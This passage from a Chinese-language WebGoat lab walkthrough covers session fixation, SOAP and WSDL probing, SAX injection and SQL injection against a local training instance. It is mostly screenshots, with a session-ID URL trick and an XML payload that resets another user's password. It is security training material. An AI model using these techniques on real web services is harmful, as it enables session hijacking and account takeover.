Image.png](https://image.3001.net/images/20171001/15068466261242.png)  

## Session Fixation（会话固定）

在网站后面添加&SID=45

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068466341270.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068466374758.png)  

按照提示输入用户名和密码

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068466446281.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/1506846647669.png)  

第四步，直接打开192.168.8.89:8080/WebGoat/start.mvc#attack/2007866518/1800&SID=45

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/1506846655853.png)  

# Web Services

## Create a SOAP Request

Web服务通过使用SOAP请求进行通信。 这些请求被提交给Web服务，试图执行在Web服务定义语言（WSDL）中定义的功能。
让我们来了解一些关于WSDL文件的内容。 查看WebGoat的Web服务描述语言（WSDL）文件。

一般目标：

尝试使用浏览器或Web Service工具连接到WSDL。
Web服务的URL是：<http://localhost/WebGoat/services/SoapRequest>通常可以在Web服务请求的末尾添加一个WSDL来查看WSDL。
您必须访问2个操作才能通过本课程。

拦截请求并通过发送有效的帐户的有效SOAP请求来调用任何方法。

您必须至少访问2个方法来传递课程。

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068466668566.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068466691901.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/1506846672989.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068466765195.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068466796149.png)  

使用burpsuit的wsdler插件分析SOAP，但是测试发现无法完成该课程，思路是对的，只是它的验证方法可能与我不对。

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068466852278.png)  

## WSDL Scanning

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068466954481.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068466982319.png)  

修改参数内容

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068467023240.png)  

## Web Service SAX Injection

Web服务通过使用SOAP请求进行通信。 这些请求被提交给Web服务，以尝试执行在Web服务定义语言（WSDL）文件中定义的功能。

一般目标：

一些Web界面在后台使用Web服务。 如果前端依赖于Web服务进行所有输入验证，则可能会破坏Web界面发送的XML。

在本练习中，尝试更改101以外的用户的密码。

在输入框输入下面内容

    
    
    <id xsi:type='xsd:int'>102</id>
    
    <password xsi:type='xsd:string'>P@$$w0rd?</password>  
    

  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068467094893.png)  

## Web Service SQL Injection

使用burpsuit的插件wsdler

  
![Clipboard
Image.png](https://image.3001.net/images/20171001/15068467148297.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068467185110.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068467265400.png)  

![Clipboard
Image.png](https://image.3001.net/images/20171001/15068507643635.png)  

